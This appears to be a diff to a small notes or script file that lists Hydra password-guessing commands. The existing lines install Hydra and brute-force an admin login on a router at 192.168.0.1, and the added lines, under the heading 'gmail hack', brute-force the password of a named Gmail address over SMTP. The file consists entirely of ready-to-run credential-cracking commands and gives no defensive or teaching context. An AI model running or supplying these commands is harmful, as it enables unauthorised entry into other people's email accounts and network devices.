@@ -1,3 +1,8 @@
 apt update
 apt install hydra
 hydra -l admin -P /sdcard/p.txt -e ns -f -V 192.168.0.1 http-get
+
+
+### gmail hack ###
+
+hydra -l testvictimgeek@gmail.com -P passwords.lst -s 465 -S -v -V -t 1 smtp.gmail.com smtp
